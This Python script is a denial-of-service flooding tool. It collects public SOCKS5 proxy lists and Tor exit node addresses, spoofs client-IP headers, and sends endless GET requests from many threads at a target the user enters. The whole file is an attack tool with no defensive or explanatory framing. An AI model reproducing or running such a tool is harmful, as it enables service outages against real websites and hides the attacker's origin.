# -*- coding: utf-8 -*-
import requests
import threading
import random
import os

os.system('cls||clear')

req = "https://raw.githubusercontent.com/SecOps-Institute/Tor-IP-Addresses/master/tor-exit-nodes.lst"
r = requests.get(req)
with open('torip.txt', 'w') as f:
	f.write(r.text)

prerandip = [line.rstrip('\n') for line in open("torip.txt")]
randip = random.choice(prerandip)

print("Spoofed exit node ip:", randip)

headers = {
 "X-Forwarded-For": randip,
 "X-Originating-IP": randip,
 "X-Remote-IP": randip,
 "X-Remote-Addr": randip,
 "X-Real-IP": randip,
 "User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0",
 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
 "Accept-Encoding": "gzip, deflate",
 "Accept-Language": "en-US,en;q=0.5",
 "Connection": "Keep-Alive"
}

target = input("Target: ")
th = int(input("Attack Threads: "))

print("Proxy list found")
req = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
r = requests.get(req)

print("storing proxies - link 1")
with open('proxy.txt', 'w') as f:
	f.write(r.text)

req = "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt"
r = requests.get(req)

print("storing proxies - link 2")
with open('proxy.txt', 'a') as f:
	f.write(r.text)

req = "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt"
r = requests.get(req)

print("storing proxies - link 3")
with open('proxy.txt', 'a') as f:
	f.write(r.text)

req = "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt"
r = requests.get(req)

print("storing proxies - link 4")
with open('proxy.txt', 'a') as f:
	f.write(r.text)

req = "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt"
r = requests.get(req)

print("storing proxies - link 5")
with open('proxy.txt', 'a') as f:
	f.write(r.text)

req = "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
r = requests.get(req)

print("storing proxies - link 6")
with open('proxy.txt', 'a') as f:
	f.write(r.text)

req = "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt"
r = requests.get(req)

print("storing proxies - link 7")
with open('proxy.txt', 'a') as f:
	f.write(r.text)


print("getting amount")
with open("proxy.txt", 'r') as fp:
	xlines = len(fp.readlines())
	xlines = int(xlines)
	print("There are: ", xlines, " proxies")

print("scanning for tor proxies")

proxlist = [line.rstrip('\n') for line in open("proxy.txt")]
approved = [':9050']
proxlist[:] = [x for x in proxlist if any(sub in x for sub in approved)]
print(proxlist)


def get_tor_session():
	session = requests.session()
	proxy = random.choice(proxlist)
	session.proxies = {'http': 'socks5h://' + proxy}
	return session


def logs():
	print("""
 
			╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
			╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
			╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
					----Error logs-----
			[clears after 10 errors per thread]
	
	""")


logs()


def attack():
	clear = 0
	while (True):
		try:
			tor_session = get_tor_session()
			tor_session.get(target, headers=headers)
		except:
			if clear == "10":
				os.system('cls||clear')
				logs()
				clear = 0
			else:
				print("Socket Connection Error:", clear)
				clear += 1


def threader():
	global threads
	threads = []
	for i in range(th):
		t = threading.Thread(target=attack)
		threads.append(t)
		t.start()


threader()